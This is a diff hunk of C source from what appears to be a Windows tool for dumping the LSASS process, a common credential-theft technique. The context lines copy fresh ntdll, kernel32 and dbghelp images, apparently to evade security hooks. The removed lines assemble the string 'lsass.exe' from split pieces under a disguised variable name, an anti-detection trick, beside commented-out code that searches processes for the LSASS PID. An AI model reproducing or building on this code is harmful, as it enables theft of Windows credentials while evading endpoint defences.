@@ -435,24 +435,6 @@ int main(int argc, char** argv) {
 		FreshCopy(sNtdllPath, sNtdll);
 		FreshCopy(sKernel32Path, sKernel32);
 		FreshCopy(sDbghelpPath, sDbghelp);
-		DWORD l$a$$Pid = 0;
-		// Find lsass PID	
-		//HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-		//PROCESSENTRY32 processEntry = {};
-		//processEntry.dwSize = sizeof(PROCESSENTRY32);
-		//LPCWSTR processName = L"";
-		//wchar_t l$a$$[] = {'l','s','a','s','s','.','e','x','e',0};
-		char l$a$$[MAX_PATH];
-		memset(l$a$$, 0, MAX_PATH);
-		char ls[] = "ls";
-		char as[] = "as";
-		char s_[] = "s.e";
-		char ex[] = "xe";
-
-		strcat(l$a$$, ls);
-		strcat(l$a$$, as);
-		strcat(l$a$$, s_);
-		strcat(l$a$$, ex);
 
 		if (!IsElevated()) {
 			printf("not admin\n");
